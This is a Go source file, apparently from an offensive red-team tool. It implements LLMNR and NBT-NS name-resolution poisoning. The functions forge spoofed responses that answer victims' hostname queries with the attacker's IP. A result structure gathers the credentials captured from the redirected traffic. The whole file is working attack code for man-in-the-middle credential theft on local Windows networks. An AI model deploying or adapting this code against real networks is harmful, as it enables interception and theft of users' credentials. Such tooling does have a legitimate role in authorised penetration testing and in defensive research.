package commands

import (
	"encoding/binary"
	"fmt"
	"net"
	"strings"
)

// LLMNR/NBT-NS/mDNS protocol constants
const (
	llmnrPort    = 5355
	llmnrMulti   = "224.0.0.252"
	nbtnsPort    = 137
	mdnsPort     = 5353
	mdnsMulti    = "224.0.0.251"
	poisonMaxDur = 600 // max 10 minutes
)

// poisonResult tracks poison session outcomes.
type poisonResult struct {
	Duration       string             `json:"duration"`
	QueriesAnswered int               `json:"queries_answered"`
	Credentials    []*sniffCredential `json:"credentials"`
	Protocols      []string           `json:"protocols"`
	ResponseIP     string             `json:"response_ip"`
	Errors         []string           `json:"errors,omitempty"`
}

// parsePoisonProtocols splits the comma-separated protocol string.
func parsePoisonProtocols(s string) map[string]bool {
	result := make(map[string]bool)
	if s == "" {
		result["llmnr"] = true
		result["nbtns"] = true
		return result
	}
	for _, p := range strings.Split(strings.ToLower(s), ",") {
		p = strings.TrimSpace(p)
		if p == "llmnr" || p == "nbtns" || p == "mdns" {
			result[p] = true
		}
	}
	if len(result) == 0 {
		result["llmnr"] = true
		result["nbtns"] = true
	}
	return result
}

// getLocalIP returns the local IP address for the specified interface, or
// the default route IP if interface is empty.
func getLocalIP(ifaceName string) (string, error) {
	if ifaceName != "" {
		iface, err := net.InterfaceByName(ifaceName)
		if err != nil {
			return "", fmt.Errorf("interface %s: %v", ifaceName, err)
		}
		addrs, err := iface.Addrs()
		if err != nil {
			return "", fmt.Errorf("interface %s addrs: %v", ifaceName, err)
		}
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && ipnet.IP.To4() != nil {
				return ipnet.IP.String(), nil
			}
		}
		return "", fmt.Errorf("no IPv4 address on %s", ifaceName)
	}
	// Auto-detect: dial a known address, read local side
	conn, err := net.Dial("udp", "8.8.8.8:53")
	if err != nil {
		return "", fmt.Errorf("auto-detect IP: %v", err)
	}
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	return localAddr.IP.String(), nil
}

// buildLLMNRResponse constructs an LLMNR response packet for a query.
// LLMNR uses DNS wire format: Transaction ID (2), Flags (2), Questions (2),
// Answers (2), Authority (2), Additional (2), then Question + Answer sections.
func buildLLMNRResponse(queryPacket []byte, responseIP net.IP) ([]byte, error) {
	if len(queryPacket) < 12 {
		return nil, fmt.Errorf("LLMNR query too short: %d bytes", len(queryPacket))
	}

	txID := queryPacket[0:2]
	// Parse the question section to get the name
	nameEnd := 12
	for nameEnd < len(queryPacket) && queryPacket[nameEnd] != 0 {
		labelLen := int(queryPacket[nameEnd])
		nameEnd += 1 + labelLen
	}
	if nameEnd >= len(queryPacket) {
		return nil, fmt.Errorf("malformed LLMNR query name")
	}
	nameEnd++ // skip the null terminator
	if nameEnd+4 > len(queryPacket) {
		return nil, fmt.Errorf("LLMNR query too short for QTYPE/QCLASS")
	}
	questionSection := queryPacket[12 : nameEnd+4]

	ip4 := responseIP.To4()
	if ip4 == nil {
		return nil, fmt.Errorf("only IPv4 supported")
	}

	// Build response
	resp := make([]byte, 0, 12+len(questionSection)+16)
	// Header
	resp = append(resp, txID...)
	resp = append(resp, 0x80, 0x00) // Flags: QR=1 (response), AA=0
	resp = append(resp, 0x00, 0x01) // QDCOUNT=1
	resp = append(resp, 0x00, 0x01) // ANCOUNT=1
	resp = append(resp, 0x00, 0x00) // NSCOUNT=0
	resp = append(resp, 0x00, 0x00) // ARCOUNT=0
	// Question section (echo back)
	resp = append(resp, questionSection...)
	// Answer section: name (pointer to question), type A, class IN, TTL 30, RDLENGTH 4, IP
	resp = append(resp, 0xC0, 0x0C) // name pointer to offset 12
	resp = append(resp, 0x00, 0x01) // TYPE A
	resp = append(resp, 0x00, 0x01) // CLASS IN
	ttl := make([]byte, 4)
	binary.BigEndian.PutUint32(ttl, 30)
	resp = append(resp, ttl...) // TTL 30s
	resp = append(resp, 0x00, 0x04) // RDLENGTH 4
	resp = append(resp, ip4...)

	return resp, nil
}

// buildNBTNSResponse constructs a NetBIOS Name Service (NBT-NS) response.
// NBT-NS uses a variant of DNS format with NetBIOS-encoded names.
func buildNBTNSResponse(queryPacket []byte, responseIP net.IP) ([]byte, error) {
	if len(queryPacket) < 12 {
		return nil, fmt.Errorf("NBT-NS query too short: %d bytes", len(queryPacket))
	}

	txID := queryPacket[0:2]
	// Parse question to find end
	nameEnd := 12
	for nameEnd < len(queryPacket) && queryPacket[nameEnd] != 0 {
		labelLen := int(queryPacket[nameEnd])
		nameEnd += 1 + labelLen
	}
	if nameEnd >= len(queryPacket) {
		return nil, fmt.Errorf("malformed NBT-NS query name")
	}
	nameEnd++
	if nameEnd+4 > len(queryPacket) {
		return nil, fmt.Errorf("NBT-NS query too short for QTYPE/QCLASS")
	}
	questionSection := queryPacket[12 : nameEnd+4]

	ip4 := responseIP.To4()
	if ip4 == nil {
		return nil, fmt.Errorf("only IPv4 supported")
	}

	// Build response
	resp := make([]byte, 0, 12+len(questionSection)+16)
	// Header
	resp = append(resp, txID...)
	resp = append(resp, 0x85, 0x00) // Flags: QR=1, AA=1, RD=1 (authoritative response)
	resp = append(resp, 0x00, 0x00) // QDCOUNT=0 (no questions in response)
	resp = append(resp, 0x00, 0x01) // ANCOUNT=1
	resp = append(resp, 0x00, 0x00) // NSCOUNT=0
	resp = append(resp, 0x00, 0x00) // ARCOUNT=0
	// Answer section: name from query, type NB (0x0020), class IN, TTL 120, RDLENGTH 6
	resp = append(resp, questionSection[:len(questionSection)-4]...) // name only
	resp = append(resp, 0x00, 0x20) // TYPE NB
	resp = append(resp, 0x00, 0x01) // CLASS IN
	ttl := make([]byte, 4)
	binary.BigEndian.PutUint32(ttl, 120)
	resp = append(resp, ttl...) // TTL 120s
	resp = append(resp, 0x00, 0x06) // RDLENGTH 6 (flags 2 + IP 4)
	resp = append(resp, 0x00, 0x00) // NB flags: B-node, unique name
	resp = append(resp, ip4...)

	return resp, nil
}

// extractLLMNRQueryName parses the queried hostname from an LLMNR query packet.
func extractLLMNRQueryName(packet []byte) string {
	if len(packet) < 13 {
		return ""
	}
	offset := 12
	var parts []string
	for offset < len(packet) {
		labelLen := int(packet[offset])
		if labelLen == 0 {
			break
		}
		offset++
		if offset+labelLen > len(packet) {
			return ""
		}
		parts = append(parts, string(packet[offset:offset+labelLen]))
		offset += labelLen
	}
	return strings.Join(parts, ".")
}

// extractNBTNSQueryName decodes a NetBIOS-encoded name from an NBT-NS query.
func extractNBTNSQueryName(packet []byte) string {
	if len(packet) < 46 { // 12 header + 1 len + 32 encoded + 1 null
		return ""
	}
	offset := 12
	labelLen := int(packet[offset])
	if labelLen != 32 {
		return ""
	}
	offset++
	if offset+32 > len(packet) {
		return ""
	}
	// NetBIOS encoding: each byte encoded as two chars (char - 'A' = nibble)
	encoded := packet[offset : offset+32]
	var name []byte
	for i := 0; i < 32; i += 2 {
		hi := encoded[i] - 'A'
		lo := encoded[i+1] - 'A'
		ch := (hi << 4) | lo
		if ch == 0x20 { // space padding
			break
		}
		name = append(name, ch)
	}
	return strings.TrimSpace(string(name))
}
